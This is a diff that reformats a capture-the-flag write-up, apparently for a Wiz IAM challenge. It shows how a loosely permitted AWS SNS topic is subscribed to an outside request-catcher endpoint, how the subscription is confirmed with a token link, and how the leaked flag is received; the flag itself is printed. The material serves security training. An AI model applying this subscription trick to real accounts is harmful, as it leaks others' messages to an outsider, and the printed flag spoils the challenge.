@@ -51,11 +51,13 @@ This misconfiguration could have been avoided by tightening the permissions arou
 
 ## Solution
 **Step-1: Capture the Flag Using Requestcatcher**
+
 To begin the process, I used Requestcatcher to create a temporary endpoint to subscribe to the SNS topic. This would allow me to receive the messages sent by the SNS topic.
 ```
 https://requestcatcher.com/
 ```
 **Step-2: Subscribe to the SNS Topic**
+
 To subscribe to the SNS topic, I used the aws sns subscribe command, specifying the topic ARN and the endpoint that matches the required condition (@tbic.wiz.io).
 ```
 aws sns subscribe \
@@ -65,6 +67,7 @@ aws sns subscribe \
 ```
 
 **Step 3: Confirm the Subscription**
+
 After subscribing, SNS sent a confirmation message to the provided endpoint. To confirm the subscription, I accessed the confirmation link provided in the message. The URL included a Token parameter that I used to confirm the subscription.
 ```
 https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&Token=2336412f37fb687f5d51e6e2425a8a5872376d572991ca2da28f73768f1d8b95ea0f71895f216143f2f1037cc2ea5795e8b34921442cff336606b3cb79056939a430c18dea0854ec15350ecd88fda926cac07c59061146a0af550e5fab5d7e0a4c29d2cf5ddcc7ded4c8b33b5f2ad181ec8f386ad8e71e01227dbb98985917a9
@@ -73,11 +76,14 @@ https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&TopicArn=arn:aws
 Once I clicked the confirmation link, the subscription was confirmed, and I was able to receive notifications from the SNS topic.
 
 **Step 4: Receive the Message**
+
 After confirming the subscription, I started receiving messages from the SNS topic. These messages contained the relevant information, including the flag or other useful data, which I could then extract for further use.
 ```
 flag: {wiz:always-suspect-asterisks}
 ```
-Step 5: Submit the Flag: Finally, I submitted the retrieved flag on the challenge platform.
+**Step 5: Submit the Flag**
+
+Finally, I submitted the retrieved flag on the challenge platform.
 
 ## Reflection
 **What was your approach?**
